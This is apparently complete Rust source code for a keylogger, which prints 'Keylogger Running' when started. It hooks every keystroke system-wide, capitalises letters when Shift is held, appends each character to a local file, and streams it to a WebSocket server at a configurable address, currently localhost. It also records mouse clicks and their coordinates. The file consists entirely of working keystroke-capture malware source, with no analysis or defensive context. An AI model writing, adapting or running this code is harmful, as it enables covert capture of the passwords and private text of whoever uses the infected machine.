use inputbot::{*};
use device_query::{DeviceQuery, DeviceState, MouseState, Keycode};
use std::fs::OpenOptions;
use std::io::prelude::*;
use tungstenite::{connect, Message};
use url::Url;

const WS_ADDRESS:&str = "ws://localhost:8765";

fn passthrough_key(event: &str) {
    file_writer(event);
    ws_client(event);
}

fn file_writer(event: &str) {
    let mut file = OpenOptions::new()
    .write(true)
    .append(true)
    .open("text.txt")
    .unwrap();

    if let Err(e) = write!(file, "{}", event) {
        eprintln!("Couldn't write to file: {}", e);
    }
}

fn ws_client(event: &str) {
    // env_logger::init();
    let (mut socket, _response) =
    connect(Url::parse(&WS_ADDRESS).unwrap()).expect("Can't connect");
    socket.write_message(Message::Text(event.into())).unwrap();
}

fn main() {
    println!("Keylogger Running =>");
    keyboard_input();
}

fn keyboard_input() {
    inputbot::KeybdKey::bind_all(|event| {
        let mut c_action = String::new();
        println!("{:?}", c_action);
        match inputbot::from_keybd_key(event) {
            Some(c) => { 
                c_action = c.to_string();
            },
            None => {
                // Fill Unregistered keys used for typing
                println!("{:?}", event);
                c_action = fill_unregistered_keys(event);
            },
        };
        
        // Device query for awareness of what other keys re being held.
        let device_state = DeviceState::new();
        let keys: Vec<Keycode> = device_state.get_keys();
        println!("Is A pressed? {}", keys.contains(&Keycode::A));
        println!("Keys Held: {:?}", &keys);
        // Captialize on Right / Left Shift hold
        if keys.contains(&Keycode::RShift) || keys.contains(&Keycode::LShift) {
            let temp = c_action.to_ascii_uppercase();
            c_action = temp;
        }
        passthrough_key(c_action.as_str());
    });

    // Bind all mouse buttons to a common callback event.
    inputbot::MouseButton::bind_all(|event| {
        let device_state = DeviceState::new();
        let mouse: MouseState = device_state.get_mouse();
        println!("Current Mouse Coordinates: {:?}", mouse.coords);
        println!("{:?}", event);
    });

    handle_input_events();
}

fn fill_unregistered_keys(event:KeybdKey) -> String {
    println!("{:?}", event);
    let mut return_string_value = String::new();
    match event{
        KeybdKey::TabKey=> return_string_value = String::from("    "),
        KeybdKey::EnterKey=> return_string_value = String::from("\n"),
        KeybdKey::SpaceKey=> return_string_value = String::from(" "),
        _=>println!("Rest of the number")
    }
    return return_string_value;
}